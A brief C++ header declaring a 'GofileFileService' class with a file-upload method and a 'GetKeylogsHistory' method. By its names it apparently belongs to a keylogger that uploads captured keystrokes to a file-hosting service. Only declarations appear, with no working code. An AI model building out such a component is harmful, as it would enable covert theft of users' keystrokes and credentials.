#pragma once
#include <string>
class GofileFileService
{
public:
	static std::string  ServiceEndpoint;
	static std::string UploadFileAsync(std::string& path);
	static std::string GetKeylogsHistory();
};

